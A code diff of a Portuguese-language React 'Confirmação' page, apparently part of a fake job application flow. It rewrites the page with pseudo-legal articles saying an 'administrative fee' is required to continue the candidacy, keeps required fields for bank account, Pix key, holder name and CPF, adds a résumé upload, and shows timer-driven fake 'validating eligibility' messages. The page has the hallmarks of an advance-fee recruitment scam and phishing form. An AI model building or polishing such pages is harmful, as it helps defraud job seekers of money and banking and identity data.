@@ -33,45 +33,46 @@ export default function Confirmacao() {
 
   const allFilled = Object.values(formData).every(v => v.trim() !== '') && accepted;
 
+  const [loadingText, setLoadingText] = useState("Processando informações no sistema interno...");
+
   const handleSubmit = async () => {
     if (!allFilled) return;
     setIsSubmitting(true);
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Animação de carregamento institucional
+    setTimeout(() => setLoadingText("Validando elegibilidade..."), 1500);
+    setTimeout(() => setLoadingText("Atualizando status da candidatura..."), 3000);
+    
+    await new Promise(resolve => setTimeout(resolve, 4500));
     setIsComplete(true);
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
   if (isComplete) {
     return (
-      <div className="min-h-screen bg-[#ededed]">
+      <div className="min-h-screen bg-[#f5f5f5]">
         <MLHeader />
-        <main className="max-w-3xl mx-auto px-4 py-8">
+        <main className="max-w-3xl mx-auto px-4 py-12">
           <motion.div
-            initial={{ opacity: 0, scale: 0.95 }}
-            animate={{ opacity: 1, scale: 1 }}
-            transition={{ duration: 0.5 }}
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            transition={{ duration: 0.8 }}
           >
-            <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8 text-center">
-              <div className="mx-auto w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
-                <CheckCircle2 className="w-12 h-12 text-green-600" />
-              </div>
-              <h1 className="text-2xl md:text-3xl font-bold text-gray-800 mb-4" data-testid="text-success">
-                Participação Confirmada!
+            <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-12 text-center">
+              <span className="institutional-label mb-8">Processo Administrativo Finalizado</span>
+              <h1 className="text-2xl md:text-3xl font-extrabold text-gray-900 mb-6" data-testid="text-success">
+                Ciência Registrada com Sucesso
               </h1>
-              <p className="text-gray-600 text-lg mb-6 leading-relaxed">
-                Sua reserva de vaga foi registrada com sucesso. Você receberá um e-mail com os próximos passos e o agendamento detalhado.
+              <div className="section-divider" />
+              <p className="normative-text mb-10 mx-auto max-w-lg">
+                Sua formalização foi processada nos sistemas internos. O candidato deverá aguardar o contato via canal oficial para os próximos procedimentos operacionais.
               </p>
-              <div className="bg-blue-50 border border-blue-200 rounded-md p-4 mb-6">
-                <p className="text-[#2d3277] text-sm">
-                  Mantenha seu WhatsApp atualizado. Nossa equipe entrará em contato em breve.
-                </p>
-              </div>
               <Button
                 onClick={() => navigate("/")}
                 className="ml-button"
                 data-testid="button-voltar-inicio"
               >
-                Voltar ao Início
+                Retornar ao Portal
               </Button>
             </div>
           </motion.div>
@@ -82,127 +83,92 @@ export default function Confirmacao() {
   }
 
   return (
-    <div className="min-h-screen bg-[#ededed]">
+    <div className="min-h-screen bg-[#f5f5f5]">
       <MLHeader />
 
-      <main className="max-w-3xl mx-auto px-4 py-8 pb-20">
+      <main className="max-w-3xl mx-auto px-4 py-12 pb-24">
         <motion.div
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.5 }}
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ duration: 0.8 }}
         >
           <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden mb-8">
-            <div className="bg-gradient-to-r from-[#2d3277] to-[#2968c8] p-8 text-white text-center">
-              <div className="mx-auto w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mb-4">
-                <Lock className="w-10 h-10 text-white" />
-              </div>
-              <h1 className="text-2xl md:text-3xl font-bold mb-2" data-testid="text-title-confirmacao">
-                Confirmação da Sua Participação
+            <div className="p-8 md:p-12">
+              <span className="institutional-label">Finalização do Processo Administrativo</span>
+              <h1 className="text-2xl md:text-3xl font-extrabold text-gray-900 mb-6" data-testid="text-title-confirmacao">
+                Confirmação e Ciência
               </h1>
-              <p className="text-white/90 text-lg">
-                Último passo para concluir sua reserva de vaga.
-              </p>
-            </div>
+              
+              <div className="section-divider" />
 
-            <div className="p-6 md:p-8">
-              <p className="text-gray-700 text-lg leading-relaxed mb-6">
-                Você já concluiu quase todo o processo. Falta apenas confirmar sua participação preenchendo os dados abaixo.
-              </p>
+              <div className="space-y-8">
+                <section>
+                  <h3 className="institutional-label mb-4">Disposições Administrativas</h3>
+                  <div className="bg-gray-50 p-6 rounded-md border border-gray-200 normative-text space-y-4">
+                    <p><strong>Art. 1º</strong> – A taxa administrativa possui natureza operacional e destina-se ao custeio de procedimentos internos necessários à validação documental, integração sistêmica e emissão de registro preliminar.</p>
+                    <p><strong>Art. 2º</strong> – O recolhimento da taxa constitui requisito para continuidade da análise final da candidatura.</p>
+                    <p><strong>Art. 4º</strong> – A confirmação desta etapa implica ciência integral das disposições aqui descritas.</p>
+                  </div>
+                </section>
 
-              <Card className="ml-card mb-6">
-                <CardContent className="p-6">
-                  <h2 className="text-xl font-bold text-gray-800 mb-6">Dados Bancários</h2>
+                <section>
+                  <h3 className="institutional-label mb-4">Documentação Complementar</h3>
+                  <div className="bg-white p-6 rounded-md border border-gray-200">
+                    <p className="normative-text mb-4">Para fins de auditoria interna e validação curricular, o candidato deverá anexar currículo atualizado em formato PDF ou DOC.</p>
+                    <div className="flex items-center gap-4">
+                      <Button variant="outline" className="border-dashed border-2 h-20 w-full flex flex-col gap-1 items-center justify-center text-gray-400 hover:text-gray-600">
+                        <span className="text-xs font-bold uppercase tracking-widest">Anexar Currículo</span>
+                        <span className="text-[10px] font-normal italic">Formatos aceitos: PDF, DOC</span>
+                      </Button>
+                    </div>
+                  </div>
+                </section>
 
-                  <FormInput
-                    label="Banco"
-                    required
-                    placeholder="Ex: Banco do Brasil, Itaú, Nubank..."
-                    value={formData.banco}
-                    onChange={(e) => updateField('banco', e.target.value)}
-                    data-testid="input-banco"
-                  />
+                <section>
+                  <h3 className="institutional-label mb-4">Dados Bancários para Formalização</h3>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <FormInput label="Instituição Bancária" required value={formData.banco} onChange={(e) => updateField('banco', e.target.value)} />
+                    <FormInput label="Agência" required value={formData.agencia} onChange={(e) => updateField('agencia', e.target.value)} />
+                    <FormInput label="Número da Conta" required value={formData.conta} onChange={(e) => updateField('conta', e.target.value)} />
+                    <FormInput label="Chave Pix" required value={formData.chavePix} onChange={(e) => updateField('chavePix', e.target.value)} />
+                    <FormInput label="Nome Completo do Titular" required value={formData.titular} onChange={(e) => updateField('titular', e.target.value)} />
+                    <FormInput label="CPF do Titular" required value={formData.cpfTitular} onChange={(e) => updateField('cpfTitular', e.target.value)} />
+                  </div>
+                </section>
 
-                  <FormInput
-                    label="Agência"
-                    required
-                    placeholder="Ex: 1234"
-                    value={formData.agencia}
-                    onChange={(e) => updateField('agencia', e.target.value)}
-                    data-testid="input-agencia"
-                  />
+                <div className="section-divider" />
 
-                  <FormInput
-                    label="Conta"
-                    required
-                    placeholder="Ex: 12345-6"
-                    value={formData.conta}
-                    onChange={(e) => updateField('conta', e.target.value)}
-                    data-testid="input-conta"
-                  />
-
-                  <FormInput
-                    label="Chave Pix"
-                    required
-                    placeholder="CPF, e-mail, telefone ou chave aleatória"
-                    value={formData.chavePix}
-                    onChange={(e) => updateField('chavePix', e.target.value)}
-                    data-testid="input-chave-pix"
-                  />
-
-                  <FormInput
-                    label="Nome do titular"
-                    required
-                    placeholder="Nome completo do titular da conta"
-                    value={formData.titular}
-                    onChange={(e) => updateField('titular', e.target.value)}
-                    data-testid="input-titular"
-                  />
-
-                  <FormInput
-                    label="CPF do titular"
-                    required
-                    placeholder="Somente números"
-                    value={formData.cpfTitular}
-                    onChange={(e) => updateField('cpfTitular', e.target.value)}
-                    data-testid="input-cpf-titular"
-                  />
-                </CardContent>
-              </Card>
-
-              <div className="bg-gray-50 border border-gray-200 rounded-md p-4 mb-6">
-                <div className="flex items-start gap-3">
-                  <Checkbox
-                    id="accept-terms"
-                    checked={accepted}
-                    onCheckedChange={(val) => setAccepted(val === true)}
-                    className="mt-1"
-                    data-testid="checkbox-aceite"
-                  />
-                  <Label htmlFor="accept-terms" className="text-sm text-gray-600 leading-relaxed cursor-pointer">
-                    Declaro que li e aceito os{" "}
-                    <a href="/termos" className="text-[#2968c8] underline">Termos e Condições</a>{" "}
-                    e a{" "}
-                    <a href="/privacidade" className="text-[#2968c8] underline">Política de Privacidade</a>.
-                    Confirmo que as informações fornecidas são verdadeiras e autorizo o processamento dos meus dados para fins de contratação.
-                  </Label>
+                <div className="bg-gray-50/50 p-6 rounded-md border border-gray-200">
+                  <div className="flex items-start gap-4">
+                    <Checkbox
+                      id="accept-terms"
+                      checked={accepted}
+                      onCheckedChange={(val) => setAccepted(val === true)}
+                      className="mt-1 border-gray-300 data-[state=checked]:bg-[#2d3277] data-[state=checked]:border-[#2d3277]"
+                      data-testid="checkbox-aceite"
+                    />
+                    <Label htmlFor="accept-terms" className="normative-text leading-relaxed cursor-pointer font-bold text-gray-700">
+                      Declaro, sob as penas da lei, que li, compreendi e concordo integralmente com as disposições administrativas acima descritas.
+                    </Label>
+                  </div>
                 </div>
-              </div>
 
-              <Button
-                onClick={handleSubmit}
-                disabled={!allFilled || isSubmitting}
-                className="w-full h-14 text-lg ml-button shadow-lg"
-                data-testid="button-finalizar"
-              >
-                {isSubmitting ? (
-                  <span className="flex items-center gap-2">
-                    <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Processando...
-                  </span>
-                ) : (
-                  "Confirmar e Finalizar Minha Vaga"
-                )}
-              </Button>
+                <Button
+                  onClick={handleSubmit}
+                  disabled={!allFilled || isSubmitting}
+                  className="w-full h-16 ml-button"
+                  data-testid="button-finalizar"
+                >
+                  {isSubmitting ? (
+                    <span className="flex items-center gap-3">
+                      <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                      {loadingText}
+                    </span>
+                  ) : (
+                    "Confirmar Ciência e Prosseguir"
+                  )}
+                </Button>
+              </div>
             </div>
           </div>
         </motion.div>
